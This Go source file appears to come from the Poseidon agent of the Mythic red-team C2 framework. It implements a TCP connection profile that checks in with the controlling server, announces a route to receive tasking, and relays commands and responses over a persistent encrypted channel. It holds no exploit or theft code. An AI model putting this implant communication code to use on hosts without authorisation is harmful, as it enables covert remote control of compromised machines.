//go:build (linux || darwin) && tcp

package profiles

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// A provider TCP profile keeps one ordered upstream connection. Provider state
// belongs to this callback, while the relay forwards its frames unchanged.
func (c *C2PoseidonTCP) handleProviderConnection(conn net.Conn) {
	c.providerConnectionMu.Lock()
	old := c.providerConnection
	c.providerConnection = conn
	c.providerReady = false
	c.providerConnectionMu.Unlock()
	if old != nil {
		_ = old.Close()
	}
	// Replacing a connection closes its reader before a new handshake starts.
	c.providerRunMu.Lock()
	defer c.providerRunMu.Unlock()
	defer func() {
		_ = conn.Close()
		c.providerConnectionMu.Lock()
		if c.providerConnection == conn {
			c.providerConnection = nil
			c.providerReady = false
		}
		c.providerConnectionMu.Unlock()
	}()
	c.providerConnectionMu.Lock()
	current := c.providerConnection == conn
	c.providerConnectionMu.Unlock()
	if !current || c.ShouldStop || c.cryptoProvider.Failed() {
		return
	}
	roundTrip := func(frame []byte) ([]byte, error) {
		if err := conn.SetDeadline(time.Now().Add(60 * time.Second)); err != nil {
			return nil, err
		}
		c.providerWriteMu.Lock()
		err := c.ChunkAndWriteData(conn, frame)
		c.providerWriteMu.Unlock()
		if err != nil {
			return nil, err
		}
		return c.ReadAndChunkData(conn)
	}
	if err := c.cryptoProvider.Register(roundTrip); err != nil {
		utils.PrintDebug(fmt.Sprintf("TCP provider registration failed: %v\n", err))
		return
	}
	body, err := json.Marshal(CreateCheckinMessage())
	if err != nil {
		return
	}
	_, callback, err := c.cryptoProvider.CheckIn(body, roundTrip)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("TCP provider check-in failed: %v\n", err))
		return
	}
	if err := conn.SetDeadline(time.Time{}); err != nil {
		return
	}
	SetMythicID(callback)
	// Cached registration/check-in produce no frames on a reconnect. Announce
	// the authenticated callback route, unless a retained output frame will do
	// so first. The single sender retains ownership of that pending output.
	if err := c.cryptoProvider.StartPush([]byte(`{"action":"get_tasking","tasking_size":0}`), func(frame []byte) error {
		c.providerWriteMu.Lock()
		defer c.providerWriteMu.Unlock()
		return c.ChunkAndWriteData(conn, frame)
	}); err != nil {
		utils.PrintDebug(fmt.Sprintf("TCP provider route announcement failed: %v\n", err))
		return
	}
	c.providerConnectionMu.Lock()
	if c.providerConnection == conn {
		c.providerReady = true
	}
	c.providerConnectionMu.Unlock()
	for !c.ShouldStop {
		frame, err := c.ReadAndChunkData(conn)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("TCP provider connection closed: %v\n", err))
			return
		}
		body, err := c.cryptoProvider.ReceivePush(frame)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("TCP provider message rejected: %v\n", err))
			if c.cryptoProvider.Failed() {
				return
			}
			continue
		}
		var message structs.MythicMessageResponse
		if err := json.Unmarshal(body, &message); err != nil {
			utils.PrintDebug(fmt.Sprintf("TCP provider response is invalid: %v\n", err))
			return
		}
		responses.HandleInboundMythicMessageFromEgressChannel <- message
	}
}

func (c *C2PoseidonTCP) sendProviderMessage(plaintext []byte) {
	// Keep this queue item's owner alive across stop/start so its retained frame
	// cannot be replaced or delivered twice by another sender.
	for {
		if c.cryptoProvider.Failed() {
			return
		}
		if c.ShouldStop {
			time.Sleep(200 * time.Millisecond)
			continue
		}
		c.providerConnectionMu.Lock()
		conn, ready := c.providerConnection, c.providerReady
		c.providerConnectionMu.Unlock()
		if conn == nil || !ready {
			time.Sleep(200 * time.Millisecond)
			continue
		}
		err := c.cryptoProvider.SendPush(plaintext, func(frame []byte) error {
			c.providerWriteMu.Lock()
			defer c.providerWriteMu.Unlock()
			c.providerConnectionMu.Lock()
			current := c.providerConnection == conn && c.providerReady
			c.providerConnectionMu.Unlock()
			if !current {
				return errors.New("TCP provider connection was replaced")
			}
			return c.ChunkAndWriteData(conn, frame)
		})
		if err == nil {
			return
		}
		utils.PrintDebug(fmt.Sprintf("TCP provider write failed: %v\n", err))
		// A partial frame cannot share a connection with a retry.
		_ = conn.Close()
		time.Sleep(200 * time.Millisecond)
	}
}

func (c *C2PoseidonTCP) closeProviderConnection() {
	c.providerConnectionMu.Lock()
	conn := c.providerConnection
	c.providerReady = false
	c.providerConnectionMu.Unlock()
	if conn != nil {
		_ = conn.Close()
	}
}
